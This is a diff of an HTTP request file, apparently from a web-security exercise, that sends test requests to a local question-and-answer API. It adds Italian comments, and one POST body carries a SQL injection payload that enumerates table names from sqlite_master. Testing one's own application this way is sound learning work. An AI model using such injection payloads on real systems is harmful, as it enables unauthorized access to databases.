@@ -3,7 +3,8 @@ GET http://localhost:3001/api/questions HTTP/1.1
 GET http://localhost:3001/api/questions/1/answers HTTP/1.1
 ###
 POST http://localhost:3001/api/answers HTTP/1.1
-Content-Type: application/json
+Content-Type: application/json    
+// importante non dimentare questa linea 
 
 {
     "text": "Text of the new answer",
@@ -17,7 +18,7 @@ Content-Type: application/json
 POST http://localhost:3001/api/answers HTTP/1.1
 Content-Type: application/json
 
-{
+{ // select da sqlite master è una tabella interna, prende i nomi delle tabelle all'interno del db 
     "text": "' || (SELECT tbl_name FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'))-- ",
     "respondent": "Bob",
     "score": 0,
